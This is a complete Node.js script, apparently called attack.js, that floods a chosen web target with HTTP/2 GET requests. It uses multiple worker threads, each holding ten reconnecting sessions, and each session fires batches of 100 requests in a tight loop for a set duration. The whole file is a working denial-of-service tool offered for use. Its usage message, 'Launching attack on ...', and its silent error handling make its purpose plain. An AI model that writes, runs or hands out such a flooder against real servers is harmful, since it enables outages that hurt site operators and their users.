const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.min(4, cpus().length);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function startFlood(client) {
        const interval = setInterval(() => {
            if (Date.now() > end) return clearInterval(interval);
            if (client.destroyed || client.closed) return;

            try {
                for (let i = 0; i < 100; i++) {
                    const req = client.request({ ':path': '/', ':method': 'GET' });
                    req.on('error', () => {});
                    req.end();
                }
            } catch (err) {
                // Ignore errors from dead sessions
            }
        }, 0);
    }

    function createConnection() {
        let client;
        try {
            client = http2.connect(target);
        } catch (err) {
            return setTimeout(createConnection, 100);
        }

        client.on('error', () => {});
        client.on('close', () => setTimeout(createConnection, 100));
        client.on('connect', () => startFlood(client));
    }

    for (let i = 0; i < 10; i++) createConnection();
}
